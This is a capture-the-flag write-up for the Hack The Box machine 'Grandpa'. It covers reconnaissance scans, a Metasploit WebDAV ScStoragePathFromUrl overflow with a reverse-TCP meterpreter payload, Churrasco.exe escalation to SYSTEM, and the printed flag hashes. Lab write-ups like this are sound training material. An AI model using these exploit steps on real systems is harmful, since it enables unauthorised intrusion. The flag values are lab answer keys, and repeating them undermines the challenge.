# Writeup
## Recon
### nmap
- While scanning, I noticed a weird quirk about this machine. I could not get nmapAutomator or rustscan to work consistently, so I did a quick nmap scan instead. It seems that there are times that even port 80 is filtered and I cannot even ping the machine. 
- **[IMPORTANT] if you experience random disconnects and at times cannot ping the machine, I suggest switching VPNs either from US to EU or vice versa for stability.**

```
┌──(kali㉿kali)-[~/HTB/machines/grandpa/10.10.10.14]
└─$ sudo nmap 10.10.10.14 -Pn --top-ports 100
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 11:54 EDT
Nmap scan report for 10.10.10.14
Host is up (0.094s latency).
Not shown: 99 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```

- When port 80 was eventually open, I ran an nmap version scan 

```
┌──(kali㉿kali)-[~/HTB/machines/grandpa/10.10.10.14]
└─$ nmap -sV -Pn 10.10.10.14 -p 80
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 12:01 EDT
Nmap scan report for 10.10.10.14
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

- Also ran an nmap vuln scan that returned some interesting vulnerability info

```
┌──(kali㉿kali)-[~/HTB/machines/grandpa/10.10.10.14]
└─$ nmap --script vuln 10.10.10.14 -p 80
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 12:05 EDT
Nmap scan report for 10.10.10.14
Host is up (0.054s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|_  /_vti_bin/shtml.exe: Frontpage file or folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 283.15 seconds
```

### nmapAutomator
- Eventually, after switching VPN servers, no more random disconnects happened, so I was able to run nmapAutomator.

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Thu, 12 Aug 2021 14:50:56 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
Starting nikto scan

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2021-08-12 10:51:34 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPFIND PROPPATCH LOCK COPY UNLOCK SEARCH MKCOL listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2021-08-12 11:08:44 (GMT-4) (1030 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

Finished nikto scan
```

```
Starting ffuf scan

                        [Status: 200, Size: 1433, Words: 131, Lines: 40]
_vti_bin                [Status: 301, Size: 158, Words: 9, Lines: 2]
_vti_bin/_vti_adm/admin.dll [Status: 200, Size: 195, Words: 5, Lines: 13]
_vti_bin/_vti_aut/author.dll [Status: 200, Size: 195, Words: 5, Lines: 13]
_vti_bin/shtml.dll      [Status: 200, Size: 96, Words: 11, Lines: 1]
Images                  [Status: 301, Size: 152, Words: 9, Lines: 2]
images                  [Status: 301, Size: 152, Words: 9, Lines: 2]

Finished ffuf scan
```

### Enumerating webpages

![8333c73a3c995ce039c9c6c6e0e2e97a.png](../../_resources/8333c73a3c995ce039c9c6c6e0e2e97a-1.png)

![e27decae2c3a50e5ac0577d39afbe342.png](../../_resources/e27decae2c3a50e5ac0577d39afbe342-1.png)


### Finding possible exploits

- The key vulnerability here lies ultimately in the IIS version 6. In particular, the ScStoragePathFromUrl Remote Buffer Overflow allows for remote code execution and has a Metasploit module.


```
┌──(kali㉿kali)-[~/HTB/machines/grandpa/10.10.10.14]                                                                                                                                                                                        
└─$ searchsploit iis 6
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                                              | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                                                    | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                  | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                                                   | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                                               | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                                               | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                                           | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                  | windows/remote/19033.txt

```

## Initial Access

### Using Metasploit scstoragepathfromurl module to get shell 
- Using the exploit module in Metasploit for the vulnerability we found earlier (remember to set the appropriate options) eventually grants a low-privileged meterpreter shell

```
msf6 > search scstorage                                                                                                                                                             [61/440]
                                                                                                                                                                                                                                            
Matching Modules                                                                                                                                                                                                                            
================                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
   #  Name                                                 Disclosure Date  Rank    Check  Description                                                                                                                                      
   -  ----                                                 ---------------  ----    -----  -----------                                                                                                                                      
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow                                                                                               
                                                                                                                                                                                                                                            
                                                                                                                      
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl
                                                                                                                      
msf6 exploit(windows/isapi/ms03_051_fp30reg_chunked) > use 0                                                          
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                              
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options                                              
                                                                                                                      
Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'f
                                             ile:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:                                            

   Id  Name                                                
   --  ----                                                
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

```

```
meterpreter > shell                                                                                                                                                                                                                [74/7215]
[-] Failed to spawn shell with thread impersonation. Retrying without it.                                             
Process 2396 created.                                                                                                 
Channel 4 created.                                                                                                    
Microsoft Windows [Version 5.2.3790]                                                                                  
(C) Copyright 1985-2003 Microsoft Corp.                                                                               
                                                                                     
c:\Inetpub>systeminfo                                                                                                 
systeminfo                                                                                                            
                                                                                                                      
Host Name:                 GRANPA                                                                                     
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition                                      
OS Version:                5.2.3790 Service Pack 2 Build 3790                                                         
OS Manufacturer:           Microsoft Corporation                                                                      
OS Configuration:          Standalone Server                                                                          
OS Build Type:             Uniprocessor Free                                                                          
Registered Owner:          HTB                                                                                        
Registered Organization:   HTB                                                                                        
Product ID:                69712-296-0024942-44782                                                                    
Original Install Date:     4/12/2017, 5:07:40 PM                                                                      
System Up Time:            0 Days, 4 Hours, 31 Minutes, 49 Seconds                                                    
System Manufacturer:       VMware, Inc.                                                                               
System Model:              VMware Virtual Platform                                                                    
System Type:               X86-based PC                                                                               
Processor(s):              1 Processor(s) Installed.                                                                  
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                              
BIOS Version:              INTEL  - 6040000                                                                           
Windows Directory:         C:\WINDOWS                                                                                 
System Directory:          C:\WINDOWS\system32                                                                        
Boot Device:               \Device\HarddiskVolume1                                                                    
System Locale:             en-us;English (United States)                                                              
Input Locale:              en-us;English (United States)                                                              
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk                                                
Total Physical Memory:     1,023 MB                                                                                   
Available Physical Memory: 792 MB                                                                                     
Page File: Max Size:       2,470 MB                                                                                   
Page File: Available:      2,326 MB                                                                                   
Page File: In Use:         144 MB                                                                                     
Page File Location(s):     C:\pagefile.sys                                                                            
Domain:                    HTB                                                                                        
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```

```
c:\Inetpub>whoami                                                                                                     
whoami                                                                                                                
nt authority\network service 
```


## Privesc
- Many Windows kernel exploits are available at https://github.com/SecWiki/windows-kernel-exploits and other places on the Internet
- After Googling for a bit, I found that Windows Server 2003 SP2 could be vulnerable to MS09-012, among MANY other local privilege escalation vulnerabilities
- In particular, I used a certain Churrasco.exe found on a certain Github page to exploit the privilege escalation (use your recon skills!) 
- First, upload Churrasco.exe to `c:/inetpub`

```
meterpreter > upload Churrasco.exe c:/inetpub
[*] uploading  : /home/kali/HTB/machines/grandpa/Churrasco.exe -> c:/inetpub
[*] uploaded   : /home/kali/HTB/machines/grandpa/Churrasco.exe -> c:/inetpub\Churrasco.exe
```

- Then, drop down to a shell and execute Churrasco.exe with the argument "cmd" to spawn a SYSTEM shell

```
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2288 created.                                      
Channel 15 created.                                        
Microsoft Windows [Version 5.2.3790]   
(C) Copyright 1985-2003 Microsoft Corp.

c:\inetpub>Churrasco.exe cmd                                                                                                                                                                                                                
Churrasco.exe cmd                                          
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x72c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\inetpub>                                                
c:\inetpub>whoami                                          
whoami 
nt authority\system
```

- We are now SYSTEM, so getting both the user and root flags is trivial!

```
C:\Documents and Settings\Harry\Desktop>type user.txt                               
type user.txt                                                                                                       
bdff5ec67c3cff017f2bedc146a5d869
```

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt                                                                                                         
9359e905a2c35f861f6a57cecf28bb7b
```

